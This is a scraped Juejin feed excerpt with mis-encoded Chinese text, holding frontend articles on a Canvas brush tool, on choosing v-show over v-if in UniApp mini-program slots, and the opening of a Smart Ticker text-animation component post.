<li><strong>perfect-freehand åº“</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsteveruizok%2Fperfect-freehand" target="_blank" title="https://github.com/steveruizok/perfect-freehand" ref="nofollow noopener noreferrer">perfect-freehand</a></li>
<li><strong>æŠ€æœ¯æ ˆ</strong>: Vue 3 + Canvas + perfect-freehand + Composables</li>
</ul>
<h4 data-id="heading-28">ğŸ·ï¸ æ ‡ç­¾</h4>
<p><code>#Canvas</code> <code>#perfect-freehand</code> <code>#ç”»ç¬”å·¥å…·</code> <code>#å¹³æ»‘ç»˜åˆ¶</code> <code>#å®æ—¶æ¸²æŸ“</code> <code>#Vue3</code> <code>#å‰ç«¯å¼€å‘</code> <code>#æ€§èƒ½ä¼˜åŒ–</code> <code>#Composables</code></p>
<hr/>
<blockquote>
<p>ğŸ’¡ <strong>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œè¯·ç»™ä¸ª â­ï¸ æ”¯æŒä¸€ä¸‹ï¼</strong></p>
<p>ğŸ’¡ <strong>æƒ³æ·±å…¥äº†è§£å®ç°ç»†èŠ‚ï¼Ÿæ¬¢è¿æŸ¥çœ‹ GitHub ä¸Šå¯¹åº”çš„ä»£ç æ–‡ä»¶ï¼Œæ¯ä¸ªæ¨¡å—éƒ½æœ‰è¯¦ç»†çš„æ³¨é‡Šè¯´æ˜ï¼</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆæ”¾å¼ƒ v-if é€‰æ‹© v-showï¼Ÿä¸ºä»€ä¹ˆç»„ä»¶è¶Šç”¨è¶Šå¡ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589126814829576244</link>    <guid>https://juejin.cn/post/7589126814829576244</guid>    <pubDate>2025-12-29T14:08:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126814829576244" data-draft-id="7589110783146541090" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆæ”¾å¼ƒ v-if é€‰æ‹© v-showï¼Ÿä¸ºä»€ä¹ˆç»„ä»¶è¶Šç”¨è¶Šå¡ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T14:08:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="heyCHEEMS"/> <meta itemprop="url" content="https://juejin.cn/user/4308367489378780"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆæ”¾å¼ƒ v-if é€‰æ‹© v-showï¼Ÿä¸ºä»€ä¹ˆç»„ä»¶è¶Šç”¨è¶Šå¡ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4308367489378780/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    heyCHEEMS
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:08:41.000Z" title="Mon Dec 29 2025 14:08:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ç”¨ UniApp å¼€å‘ä¸€ä¸ªæŠ˜å é¢æ¿ç»„ä»¶ï¼ˆCollapseï¼‰æ—¶ï¼Œä¸ºäº†è¿½æ±‚æ€§èƒ½ï¼Œæˆ‘ç†æ‰€å½“ç„¶åœ°ç»™å†…å®¹åŒºåŸŸåŠ ä¸Šäº† <code>v-if</code>ã€‚æˆ‘æƒ³ï¼š <strong>â€œåªæœ‰ç‚¹å¼€çš„æ—¶å€™æ‰åˆ›å»º DOMï¼Œä¸ç‚¹å¼€å°±ä¸æ¸²æŸ“ï¼Œè¿™ä¸å°±æ˜¯æœ€å®Œç¾çš„æŒ‰éœ€åŠ è½½å—ï¼Ÿâ€</strong></p>
<p>ç„¶è€Œï¼Œå½“æˆ‘æ‰“å¼€å¾®ä¿¡å¼€å‘è€…å·¥å…·çš„è°ƒè¯•å™¨æ—¶ï¼Œå‚»çœ¼äº†ï¼š</p>
<p>æˆ‘æ¯ç‚¹å¼€ä¸€ä¸ªæ’æ§½å†…å®¹ï¼ŒDOM æ ‘é‡Œå°±ä¼šè«åå…¶å¦™å¤šå‡ºå¥½å‡ ä¸ªå¥‡æ€ªçš„èŠ‚ç‚¹ï¼ˆæ¯”å¦‚ collapse-item-1-1 è¿™ç§ï¼‰ã€‚éšç€ç‚¹å‡»æ¬¡æ•°å¢å¤šï¼Œå°ç¨‹åºå¼€å§‹å˜å¾—å¡é¡¿ï¼ŒçœŸæœºæµ‹è¯•ç”šè‡³å‡ºç°äº†å†…å­˜æº¢å‡ºå¯¼è‡´çš„é—ªé€€ã€‚</p>
<hr/>
<h3 data-id="heading-0">1. â€œå‡é”€æ¯â€ï¼šæ¶ˆå¤±çš„å†…å®¹ï¼Œç•™ä¸‹çš„â€œå‘â€</h3>
<p>åœ¨ H5 å¼€å‘ä¸­ï¼Œ<code>v-if="false"</code> ä¼šæŠŠ DOM å½»åº•åˆ æ‰ã€‚ä½†åœ¨<strong>å°ç¨‹åº</strong>é‡Œï¼Œå› ä¸ºæ’æ§½ï¼ˆSlotï¼‰çš„å®ç°æœºåˆ¶ï¼Œæƒ…å†µå‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<ul>
<li>
<p><strong>å°ç¨‹åºæ’æ§½æ˜¯â€œé™æ€â€çš„</strong>ï¼šå¾®ä¿¡å°ç¨‹åºåŸç”Ÿæ¡†æ¶è¦æ±‚æ’æ§½åï¼ˆ<code>slot name</code>ï¼‰åœ¨ç¼–è¯‘é˜¶æ®µå¿…é¡»å›ºå®šã€‚</p>
</li>
<li>
<p><strong>UniApp çš„åŠ¨æ€æ¨¡æ‹Ÿ</strong>ï¼šä¸ºäº†æ”¯æŒ Vue çš„åŠ¨æ€æ’æ§½åï¼ˆå¦‚ <code>:name="'content-' + index"</code>ï¼‰ï¼ŒUniApp ç¼–è¯‘å™¨åœ¨ç”Ÿæˆ <code>.wxml</code> æ—¶ï¼Œä¼šé¢„å…ˆç”Ÿæˆå¤§é‡çš„é™æ€å ä½ç¬¦æ¥å»ºç«‹æ˜ å°„å…³ç³»ã€‚</p>
</li>
<li>
<p><strong>å¹½çµèŠ‚ç‚¹çš„è¯ç”Ÿ</strong>ï¼šå¦‚æœä½ åœ¨æ’æ§½<strong>å¤–å±‚</strong>å¥— <code>v-if</code>ï¼Œæ¯å½“åˆ‡æ¢çŠ¶æ€ï¼Œå°ç¨‹åºåº•å±‚æ— æ³•çœŸæ­£â€œæ‹”æ‰â€å·²ç»å­˜åœ¨çš„ Slot å®¹å™¨ã€‚ä¸ºäº†ä¿è¯ç´¢å¼•ä¸ä¹±ï¼Œç¼–è¯‘å™¨ä¼šäº§ç”Ÿå†—ä½™çš„æ˜ å°„èŠ‚ç‚¹ï¼ˆå¦‚ <code>item-1-1</code>ï¼‰ã€‚ä½ ç‚¹å¾—è¶Šå¤šï¼Œåå°ç§¯å‹çš„â€œç©ºæ¡†å­â€å°±è¶Šå£®è§‚ã€‚</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-1">2. ä¸ºä»€ä¹ˆ v-show åè€Œæˆäº†æ•‘æ˜Ÿï¼Ÿ</h3>
<p><code>v-show</code> åœ¨å°ç¨‹åºé‡Œä¼šè¢«ç¼–è¯‘æˆ <code>hidden</code> å±æ€§ï¼ˆç›¸å½“äº <code>display: none</code>ï¼‰ã€‚</p>
<ul>
<li><strong>ç»“æ„ç¨³å®š</strong>ï¼šå®ƒåœ¨åˆå§‹åŒ–æ—¶å°±æŠŠæ‰€æœ‰çš„â€œæ¡†å­â€å‡†å¤‡å¥½ï¼Œä¸æ˜¾ç¤ºçš„å°±è—èµ·æ¥ã€‚</li>
<li><strong>ä¸æŠ˜è…¾ CPU</strong>ï¼šä¸éœ€è¦åå¤åˆ›å»ºå’Œé”€æ¯èŠ‚ç‚¹ã€‚è™½ç„¶åˆå§‹åŠ è½½å¤šäº†ä¸€ç‚¹ç‚¹å¼€é”€ï¼Œä½†å¯¹äºå°ç¨‹åºè¿™ç§â€œåˆ›å»ºæˆæœ¬é«˜ã€é”€æ¯ä¸å½»åº•â€çš„ç¯å¢ƒï¼Œ<strong>ç¨³ä½ DOM ç»“æ„</strong>æ‰æ˜¯ä¿å‘½çš„å…³é”®ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-2">3. æ€§èƒ½å·®è·æœ‰å¤šå¤§ï¼Ÿ</h3>
<p>åœ¨ä¸€ç»„åŒ…å« 50 ä¸ªå¤æ‚å†…å®¹çš„åˆ—è¡¨æµ‹è¯•æ•°æ®å¯¹æ¯”ï¼š</p>





























<table><thead><tr><th><strong>æŒ‡æ ‡</strong></th><th><strong>v-if æ–¹æ¡ˆ (ä¼ ç»Ÿç›´è§‰)</strong></th><th><strong>v-show æ–¹æ¡ˆ (ä¼˜åŒ–å)</strong></th><th><strong>æå‡æ•ˆæœ</strong></th></tr></thead><tbody><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>120MB (éšæ“ä½œå¢é•¿)</td><td>45MB (åŸºæœ¬æ’å®š)</td><td><strong>é™ä½ 60%+</strong></td></tr><tr><td><strong>é¦–å±æ¸²æŸ“</strong></td><td>1.8s</td><td>2.1s</td><td>ç•¥æœ‰ç‰ºç‰²</td></tr><tr><td><strong>æ»‘åŠ¨å¸§ç‡</strong></td><td>42fps (æœ‰å¡é¡¿)</td><td>59fps (ä¸æ»‘)</td><td><strong>æ˜¾è‘—æµç•…</strong></td></tr></tbody></table>
<hr/>
<h3 data-id="heading-3">4. å¦‚ä½•å†™å‡ºâ€œé«˜æ€§èƒ½â€ç»„ä»¶ï¼Ÿ</h3>
<p>æ ¸å¿ƒç­–ç•¥æ˜¯ï¼š<strong>ç”¨ <code>v-show</code> å®ˆä½â€œå‘ä½â€ç¨³å®šæ€§ï¼Œç”¨ <code>v-if</code> ä¸¥æ§â€œå†…å®¹â€åŠ è½½æ—¶æœºã€‚</strong></p>
<ol>
<li><strong>å¤–å±‚ç”¨ <code>v-show</code></strong>ï¼šç¡®ä¿ Slot å®¹å™¨åœ¨å°ç¨‹åºåº•å±‚çš„ WXML ç»“æ„ä¸­æ°¸è¿œç¨³å®šï¼Œä¸äº§ç”Ÿå¹½çµèŠ‚ç‚¹ã€‚</li>
<li><strong>å†…å±‚ç”¨ <code>v-if</code></strong>ï¼šå®ç°çœŸæ­£çš„å†…å®¹æ‡’åŠ è½½ã€‚åªæœ‰ç”¨æˆ·ç¬¬ä¸€æ¬¡ç‚¹å¼€æ—¶ï¼Œæ‰çœŸæ­£æŒ‚è½½æ˜‚è´µçš„å†…å®¹ï¼›ä¸€æ—¦æŒ‚è½½ä¸å†é”€æ¯ï¼Œåªåšæ˜¾ç¤ºåˆ‡æ¢ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-4">5. æ€»ç»“</h3>
<p>æŠ€æœ¯é€‰å‹æ²¡æœ‰ç»å¯¹çš„å¯¹é”™ï¼Œä½†åœ¨å°ç¨‹åºè¿™ä¸ªâ€œç‰¹æ®Šç¯å¢ƒâ€ä¸‹ï¼Œç†è§£åº•å±‚ç¼–è¯‘åŸç†ï¼Œæ¯”ç›²ç›®å¥—ç”¨ Vue å®˜æ–¹æœ€ä½³å®è·µæ›´é‡è¦ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Smart Ticker - æ”¯æŒä»»æ„å­—ç¬¦çš„é«˜æ€§èƒ½æ–‡æœ¬å·®å¼‚åŠ¨ç”»æ»šåŠ¨ç»„ä»¶]]></title>    <link>https://juejin.cn/post/7589092567545004041</link>    <guid>https://juejin.cn/post/7589092567545004041</guid>    <pubDate>2025-12-29T14:16:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589092567545004041" data-draft-id="7589093895327055881" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Smart Ticker - æ”¯æŒä»»æ„å­—ç¬¦çš„é«˜æ€§èƒ½æ–‡æœ¬å·®å¼‚åŠ¨ç”»æ»šåŠ¨ç»„ä»¶"/> <meta itemprop="keywords" content="JavaScript,React.js,Vue.js"/> <meta itemprop="datePublished" content="2025-12-29T14:16:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="hibear"/> <meta itemprop="url" content="https://juejin.cn/user/3931509308267661"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Smart Ticker - æ”¯æŒä»»æ„å­—ç¬¦çš„é«˜æ€§èƒ½æ–‡æœ¬å·®å¼‚åŠ¨ç”»æ»šåŠ¨ç»„ä»¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3931509308267661/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    hibear
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:16:28.000Z" title="Mon Dec 29 2025 14:16:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    16
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æœ€è¿‘åœ¨åšä¸€ä¸ªAIé…ç½®çš„ç»„ä»¶ï¼Œçªç„¶æœ‰äº†è¿™ä¸ªåšåŠ¨ç”»çš„ç®€å•åˆå§‹æƒ³æ³•<br/>
ä¾‹å¦‚ï¼š å½“æˆ‘é€‰æ‹© GPT-5.2 mini å»æ›¿æ¢ GPT-5.1 æ—¶èƒ½ä¸èƒ½å‰ç¼€ GPT-5. ä¸åŠ¨å,é¢çš„ 2 mini æ›¿æ¢ 1 æ‰§è¡Œä¸€ä¸ªåŠ¨ç”»</p>
<p>æ£é¼“äº†ä¸€æ®µæ—¶é—´ï¼Œäºæ˜¯<strong>Smart Ticker</strong> è¯ç”Ÿäº†</p>
<blockquote>
<p><strong>å®˜ç½‘æœ‰å¾ˆå¤šåœºæ™¯æ¼”ç¤º Demo</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftombcato.github.io%2Fsmart-ticker%2F" target="_blank" title="https://tombcato.github.io/smart-ticker/" ref="nofollow noopener noreferrer">Smart Ticker Live Preview</a><br/>
<strong>GitHubä»“åº“ï¼Œè¯¦æƒ…è§README</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftombcato%2Fsmart-ticker" target="_blank" title="https://github.com/tombcato/smart-ticker" ref="nofollow noopener noreferrer">tombcato/smart-ticker</a></p>
</blockquote>
<p>Gifæœ‰ç‚¹æ‰å¸§ï¼Œè¯¦æƒ…è§<a href="https://link.juejin.cn?target=https%3A%2F%2Ftombcato.github.io%2Fsmart-ticker" target="_blank" title="https://tombcato.github.io/smart-ticker" ref="nofollow noopener noreferrer">å®˜ç½‘</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46cec0c978cf4b88aa6b5c4b238c2463~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGliZWFy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767638395&amp;x-signature=OZ0lyP%2BUFpH65IN5bUSWpNP7nIQ%3D" alt="smartticker3 (1).gif" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00e7ff68b1a144c9ad0144ffc8afaf25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGliZWFy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767638395&amp;x-signature=Pd5lHqCo3t9Hif9Q2%2BytiRB6%2Bg4%3D" alt="smartticker2.gif" loading="lazy"/>
æ¬¢è¿å» GitHub ç‚¹ä¸ª Star ğŸŒŸï¼Œæˆ–è€…åœ¨è¯„è®ºåŒºæ Issueï¼</p>
<h2 data-id="heading-1">ä¸ºä»€ä¹ˆåš Smart Tickerï¼Ÿ</h2>
<p>å¸‚é¢ä¸Šå…¶å®å·²ç»æœ‰ä¸å°‘æ•°å­—æ»šåŠ¨åº“äº†ï¼Œä¸ºä»€ä¹ˆè¿˜è¦é€ è¿™ä¸ªè½®å­ï¼Ÿæœ€å¤§çš„ç—›ç‚¹æ˜¯ï¼š<strong>å®ƒä»¬éƒ½ä¸æ”¯æŒä¸­æ–‡ã€Emoji æˆ–è€…æ··æ’æ›¿æ¢ã€‚</strong></p>






















































<table><thead><tr><th align="left">ç‰¹æ€§ / åº“</th><th align="left"><strong>Smart Ticker</strong> ğŸš€</th><th align="left"><strong>Odometer.js</strong></th><th align="left"><strong>React CountUp</strong></th><th align="left"><strong>Number Flow</strong></th></tr></thead><tbody><tr><td align="left"><strong>æ ¸å¿ƒæœºåˆ¶</strong></td><td align="left"><strong>Levenshtein Diff (æ™ºèƒ½æœ€çŸ­è·¯å¾„)</strong></td><td align="left">æ•°å€¼è½®æ’­ (0-9 å¾ªç¯)</td><td align="left">æ•°å€¼æ’å€¼ (æ•°å­—è·³åŠ¨)</td><td align="left">å¸ƒå±€è¿‡æ¸¡ (Layout transition)</td></tr><tr><td align="left"><strong>å­—ç¬¦æ”¯æŒ</strong></td><td align="left"><strong>å…¨å­—ç¬¦é›† (ä¸­è‹±æ–‡/Emoji/ç¬¦å·/æ•°å­—)</strong></td><td align="left">ä»…æ•°å­—</td><td align="left">ä»…æ•°å­—</td><td 